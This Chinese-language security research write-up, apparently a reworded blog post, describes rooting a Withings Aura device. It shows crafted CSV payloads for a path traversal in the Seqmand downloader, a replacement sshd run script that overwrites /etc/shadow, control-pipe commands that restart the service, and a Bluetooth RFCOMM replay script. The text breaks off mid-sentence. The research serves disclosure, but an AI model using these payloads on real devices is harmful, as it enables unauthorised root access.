### 优化后的文本

---

**Seqmand 下载流程与目录遍历攻击**

Seqmand 会根据 CSV 文件中的每一行信息，下载相应的文件到临时目录。例如，对于以下 CSV 文件：

```
WAKEUP_4;1;v3_audio_main_part_1.mp3;77c1b5fd054233f1d6e0dd12d0d419c5;5272
WAKEUP_3;1;v3_audio_main_part_2.mp3;e4d0620ab9fa56cb1ef29485c4377a01;1160
```

Seqmand 将执行以下下载操作：
- 从 `http://XXXXXXX/content/aura/sequences-v3/WAKEUP_4/v3_audio_main_part_2.mp3` 下载到 `/tmp/sequences/WAKEUP_4/v3_audio_main_part_2.mp3`
- 从 `http://XXXXXXX/content/aura/sequences-v3/WAKEUP_4/v3_audio_main_part_1.mp3` 下载到 `/tmp/sequences/WAKEUP_4/v3_audio_main_part_1.mp3`
- 从 `http://XXXXXXX/content/aura/sequences-v3/WAKEUP_3/v3_audio_main_part_2.mp3` 下载到 `/tmp/sequences/WAKEUP_3/v3_audio_main_part_2.mp3`

下载完成后，这些临时文件将被移动到 `/usr/share/sequences` 目录中。

我通过重定向 Seqmand 的 HTTP 请求到自己的服务器，并提供了一个自定义的 `aura_seq_list.csv` 文件，发现可以进行目录遍历攻击。例如，使用以下 CSV 文件：

```
#name;is_mandatory;filename;md5;filesize;
WAKEUP_42;1;../../../test;cbb788cf62b23c4bf6e91042576d75a3;720
```

Seqmand 将执行以下操作：
- 从 `http://XXXXXXX/content/test` 下载到 `/tmp/sequences/WAKEUP_42/../../../test`

我在笔记本电脑上使用静态编译的 QEMU 仿真了守护进程的操作，成功创建了 `/test` 文件。有关如何编译和使用 QEMU 的详细信息，请参阅 [这篇文章](http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/)。

我的第一个计划是用自定义密码覆盖 `/etc/shadow` 文件。使用以下 CSV 文件：

```
#name;is_mandatory;filename;md5;filesize;
WAKEUP_42;1;../../../etc/shadow;326c68d758d21b2a4bb1f5e14931c2b4;720
```

在 QEMU 模拟器上测试成功，但在实际设备上失败。通过进一步研究，找到了失败的原因。

**日志文件提取**

在浏览文件系统时，我发现了一个脚本 `/usr/bin/usb_hd_hotplug`，该脚本会在 USB 驱动器插入 Aura 接口时自动启动。该脚本执行以下操作：
- 挂载 USB 驱动器
- 检查并运行签名脚本（如果有效）
- 执行 `flash_from_usb` 函数
- 执行 `copy_logs` 函数

`flash_from_usb` 函数需要有签名的 FPKG 镜像文件才能执行。`copy_logs` 函数会搜索名为 `withings-options` 的文件，如果该文件包含 `copy_logs=1` 这一行，则复制日志文件到 USB 驱动器。

```sh
copy_logs() {
  cat $MOUNT_POINT/withings-options 2> /dev/null | grep "copy_logs=1" -q || return 1
  logger -t automount "Copying logs"
  color 4000 1 4000 # purple
  cp /var/log/messages* $MOUNT_POINT
  sync
  sleep 1
  color 1 1 1
}
```

**工作目录遍历漏洞利用**

通过日志文件，我发现大多数操作系统都在只读分区上运行，但某些部分仍然是可写的。例如，在 `/etc/init.d/prepare_services` 脚本中有以下代码：

```sh
mkdir -p /var/service
cp -r /etc/init.d/services/* /var/service
ulimit -c 10000
runsvdir /var/service &
```

这意味着 `runsv` 进程的文件夹是从可写目录 `/var/service` 加载的。例如，`/var/service/sshd/` 目录的内容如下：

```
sshd
├── down
├── run
└── supervise
    ├── control
    ├── lock
    ├── ok
    ├── pid
    ├── stat
    └── status
```

我决定覆盖 `/var/service/sshd/run` 脚本，但由于该脚本仅在引导时启动一次，无法及时覆盖。因此，我需要一种方法强制重新启动 SSH 守护程序。通过写入 `/var/service/sshd/supervise/control` 命名管道来实现：

```sh
echo k > /var/service/sshd/supervise/control
echo u > /var/service/sshd/supervise/control
```

这将杀死并重新启动 `sshd` 服务，并再次执行 `run` 脚本。使用以下 CSV 文件：

```
#name;is_mandatory;filename;md5;filesize;
WAKEUP_5;1;../../../var/service/sshd/run;672a1e6b4a9b2ce8ebef3755217faf8b;720
WAKEUP_6;1;../../../var/service/sshd/supervise/control;8ce4b16b22b58894aa86c421e8759df3;720
WAKEUP_7;1;../../../var/service/sshd/supervise/control;7b774effe4a349c6dd82ad4f4f21d34c;720
```

提供的 `run` 文件内容如下：

```sh
#!/bin/sh
mount -oremount,rw /
echo "Your shadow comes here" > /etc/shadow
exec dropbear -F &> /dev/null
```

首次命中控制文件时发送 `k`，第二次发送 `u`。攻击成功后，我获得了 SSH root 访问权限。使用的脚本可以在 [这里](https://courk.fr/wp-content/uploads/MITM_seqmand_release.zip) 下载。

**安装 GDBServer**

通过 SSH 访问，我可以更好地了解设备内部的工作原理，并玩转设备的外设。下一步，我决定交叉编译一个 `gdbserver`。使用 Buildroot 来编译，配置文件在此处。对于不熟悉 Buildroot 的用户，只需将我的 defconfig 文件复制到新克隆的 [Buildroot 仓库](https://github.com/buildroot/buildroot) 的 `configs/` 文件夹中，并运行以下命令：

```sh
$ make aura_gdbserver_defconfig
$ make
```

生成的 `gdbserver` 二进制文件将输出到目标的 `/usr/bin` 目录中。尽管有时会崩溃，但对于设置断点和探测内存已经足够。

**蓝牙远程代码执行 (RCE)**

利用 SSH 访问权限和 `gdbserver`，我发现了设备蓝牙协议中的缓冲区溢出漏洞。

**逆向蓝牙通信**

为了理解智能手机应用程序与设备之间的通信方式，我使用 Android 手机的“Bluetooth HCI snoop log”功能嗅探蓝牙通信。应用程序在通道 9 上使用 RFCOMM 与设备通信。第一步，我尝试重放一些数据包，使用以下 Python 脚本：

```python
#!/usr/bin/env python3
import socket
import time
import sys

if __name__ == "__main__":
    payloads = [
        b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x0c",
        b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x42",
        b"\x01\x01\x00\x0b\x01\x09\x0f\x00\x06\x09\x0d\x00\x02\x01\x00"
    ]
    if len(sys.argv) != 2:
        print("Usage: {} <MAC_ADDRESS>".format(sys.argv[0]))
        exit(-1)
    mac = sys.argv[1]
    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    print("Connecting to Aura ({})".format(mac))
    try:
        s.connect((mac, 9))
    except:
        print("Error while connecting to {}".format(mac))
        exit(-1)
    for i in range(2):
        for payload in payloads:
            s.send(payload)
            time.sleep(1)
    s.close()
    print("Done")
```

该脚本按预期工作。接下来，我试图了解发送的数据包结构。通过反汇编共享库 `libpairing.so` 和 `nm`，负责蓝牙和 WiFi 通信的二进制文件结构大致如下：

---